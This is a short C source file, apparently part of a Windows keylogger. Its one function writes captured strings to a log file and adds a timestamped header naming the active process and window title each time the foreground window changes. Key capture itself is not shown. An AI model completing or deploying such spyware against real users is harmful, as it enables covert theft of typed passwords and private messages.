#include "winkey.h"

FILE *g_logfile;
HWND g_last_window = NULL;

void write_to_log(const char *str)
{
	// Check if the active window changed
	if (g_foreground_window != g_last_window)
	{
		g_last_window = g_foreground_window;

		// Write a new header with timestamp, process name, and window title
		time_t t = time(NULL);
		struct tm tm = *localtime(&t);
		fprintf(g_logfile, "\n>>> %04d-%02d-%02d %02d:%02d:%02d (%s) %s\n",
				tm.tm_year + 1900,
				tm.tm_mon + 1,
				tm.tm_mday,
				tm.tm_hour,
				tm.tm_min,
				tm.tm_sec,
				g_process_name,
				g_window_title);
	}

	// Log the captured string
	fprintf(g_logfile, "%s", str);
	fflush(g_logfile);
}
